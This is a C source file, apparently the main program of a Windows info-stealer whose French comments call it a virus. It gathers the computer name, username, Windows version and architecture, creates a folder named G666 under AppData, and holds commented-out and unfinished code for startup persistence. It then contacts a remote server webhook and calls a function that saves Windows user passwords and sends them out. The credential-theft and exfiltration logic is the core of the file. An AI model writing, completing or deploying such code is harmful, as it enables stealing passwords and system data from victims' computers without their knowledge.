#include <stdio.h>
#include <string.h>

#include "computer_informations.c"
#include "windows_users_passwords.c"
#include "autostart.c"
//#include "persistance.c"

#include "../include/http.h"
#include "../include/structures.h"

/*
LISTE FONCTIONS EXTERNES UTILES A CE FICHIER

src/http.c:
    -send_to_server(char* route, char* data)

src/computer_informations.c:
    -get_computer_info(char * computer_name, char * username, char * arch)

src/windows_users_passwords:
    -save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info)
*/

int is_first_execution(){
    
    /*Fonction à coder pour éviter de recréer le dossier du virus et sa persistance vue qu'il s'execute au démarage*/

    return 0; // ou return 1
};

int main(void){

    char executable_name[] = "main.exe";

    COMPUTER_INFOS computer;
    get_computer_info(&computer);

    // je créer le dossier du logiciel
    char softwareDataDirectory[1024];
    snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);
    CreateDirectory(softwareDataDirectory, NULL);

    /* faire en sorte que le virus s'execute à tous les démarage du pc
    set_persistance(softwareDataDirectory, executable_name); pas encore opérationnel*/

    // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // dossier de démarrage de windows

    /*// Chemin du répertoire du logiciel et nom de l'exécutable
    const char *repertoireLogiciel = "C:\\Users\\%s\\AppData\\Local\\G666";
    const char *nomExecutable = "main.exe";
    add_winstart(repertoireLogiciel, nomExecutable);*/

    printf("\nComputer Name: %s\n", computer.computer_name);
    printf("Username: %s\n", computer.username);
    printf("Windows Version: %s\n", computer.windows_version);
    printf("Architecture: %s\n\n", computer.architecture);


    send_to_server("/webhook/client.php", "{\"client_id\":1}");
    save_and_send_windows_users_password(&computer);
    return 0;
}